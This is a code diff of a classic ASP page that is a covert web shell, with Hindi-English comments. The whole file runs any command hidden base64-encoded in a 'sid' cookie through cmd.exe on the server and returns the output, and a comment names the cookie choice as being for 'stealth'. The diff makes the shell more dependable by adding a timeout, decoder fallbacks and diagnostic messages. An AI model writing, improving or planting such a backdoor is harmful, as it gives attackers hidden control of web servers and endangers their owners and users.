@@ -4,42 +4,58 @@ Response.Buffer = True
 Response.CacheControl = "private"
 Response.Expires = -1
 
-Dim cmdCookie, decodedCmd, objShell, objExec, output, errOutput
+Dim cookieValue, decodedCmd, objShell, objExec
+Dim stdOut, stdErr, fullOutput
 
-' Cookie name (change kar sakta hai stealth ke liye)
-cmdCookie = Request.Cookies("sid")
+' Cookie name (stealth ke liye change kar sakta hai)
+cookieValue = Request.Cookies("sid")
 
-If Len(cmdCookie) > 10 Then
+' Debug: cookie check (production mein remove kar dena)
+' Response.Write "<!-- Cookie raw: " & Server.HTMLEncode(cookieValue) & " | Length: " & Len(cookieValue) & " -->"
+
+If Len(cookieValue) > 10 Then
     ' Base64 decode
-    decodedCmd = Base64Decode(cmdCookie)
+    decodedCmd = Base64Decode(cookieValue)
+    
+    ' Debug: decoded command check (production mein remove)
+    ' Response.Write "<!-- Decoded: " & Server.HTMLEncode(Left(decodedCmd, 100)) & "... -->"
     
     If Len(decodedCmd) > 3 Then
         On Error Resume Next
         
-        ' Alternate ways to execute command (WScript.Shell sabse common block hota hai)
         Set objShell = Server.CreateObject("WScript.Shell")
         
         If Err.Number <> 0 Then
-            ' Agar WScript.Shell block hai to error show kar
-            Response.Write "<pre style='color:red;'>[ERROR] WScript.Shell create failed: " & Err.Description & "</pre>"
+            Response.Write "<pre style='color:red; background:#111; padding:10px;'>"
+            Response.Write "[CRITICAL] WScript.Shell create nahi ho pa raha: " & Err.Description & vbCrLf
+            Response.Write "Possible reason: IIS/AppPool user ko permission nahi (Act as part of OS / Replace token)"
+            Response.Write "</pre>"
         Else
-            ' Exec cmd
+            ' cmd.exe /c se execute
             Set objExec = objShell.Exec("cmd.exe /c " & decodedCmd)
             
-            ' Output read karne se pehle wait (kabhi kabhi hang hota hai)
-            Do While objExec.Status = 0
-                WScript.Sleep 100
+            ' Wait for completion (hang avoid)
+            Dim timeout : timeout = 0
+            Do While objExec.Status = 0 And timeout < 30
+                WScript.Sleep 200
+                timeout = timeout + 1
             Loop
             
-            output = objExec.StdOut.ReadAll
-            errOutput = objExec.StdErr.ReadAll
+            stdOut = objExec.StdOut.ReadAll
+            stdErr = objExec.StdErr.ReadAll
             
-            If Len(output) > 0 Then
-                Response.Write "<pre>" & Server.HTMLEncode(output) & "</pre>"
+            fullOutput = stdOut
+            If Len(stdErr) > 0 Then
+                fullOutput = fullOutput & vbCrLf & "[ERROR]" & vbCrLf & stdErr
             End If
             
-            If Len(errOutput) > 0 Then
-                Response.Write "<pre style='color:#ff4444;'>[ERROR]" & vbCrLf & Server.HTMLEncode(errOutput) & "</pre>"
+            If Len(fullOutput) > 0 Then
+                ' Output ko safe render karo
+                Response.Write "<pre style='color:#0f0; background:#000; padding:15px; border:1px solid #0f0; white-space:pre-wrap;'>"
+                Response.Write Server.HTMLEncode(fullOutput)
+                Response.Write "</pre>"
+            Else
+                Response.Write "<pre style='color:#888;'>Command executed but no output returned.</pre>"
             End If
             
             Set objExec = Nothing
@@ -47,21 +63,39 @@ If Len(cmdCookie) > 10 Then
         
         Set objShell = Nothing
         On Error Goto 0
+    Else
+        Response.Write "<pre style='color:#888;'>Decoded command too short or invalid.</pre>"
     End If
 Else
-    ' Cookie nahi hai ya chhota hai
-    Response.Write "<pre style='color:#888;'>No valid command in cookie (sid).</pre>"
+    Response.Write "<pre style='color:#888;'>No valid command in cookie (sid). Length: " & Len(cookieValue) & "</pre>"
 End If
 
-' Base64 decode function (Msxml2 use kar raha hai - agar yeh block hai to alternative chahiye)
+' Improved Base64 decode function
 Function Base64Decode(strBase64)
-    Dim xmlDoc, xmlNode
-    Set xmlDoc = Server.CreateObject("Msxml2.DOMDocument.6.0")
-    Set xmlNode = xmlDoc.CreateElement("b64")
-    xmlNode.DataType = "bin.base64"
-    xmlNode.Text = strBase64
-    Base64Decode = StrConv(xmlNode.NodeTypedValue, vbUnicode)
-    Set xmlNode = Nothing
-    Set xmlDoc = Nothing
+    Dim xml, node
+    On Error Resume Next
+    Set xml = Server.CreateObject("Msxml2.DOMDocument.6.0")
+    If Err.Number <> 0 Then
+        Set xml = Server.CreateObject("Msxml2.DOMDocument.3.0")
+    End If
+    Set node = xml.createElement("b64")
+    node.dataType = "bin.base64"
+    node.text = strBase64
+    
+    Dim bin : bin = node.nodeTypedValue
+    Dim stream : Set stream = Server.CreateObject("ADODB.Stream")
+    stream.Type = 1 ' adTypeBinary
+    stream.Open
+    stream.Write bin
+    stream.Position = 0
+    stream.Type = 2 ' adTypeText
+    stream.Charset = "us-ascii"
+    Base64Decode = stream.ReadText
+    stream.Close
+    
+    Set node = Nothing
+    Set xml = Nothing
+    Set stream = Nothing
+    On Error Goto 0
 End Function
 %>
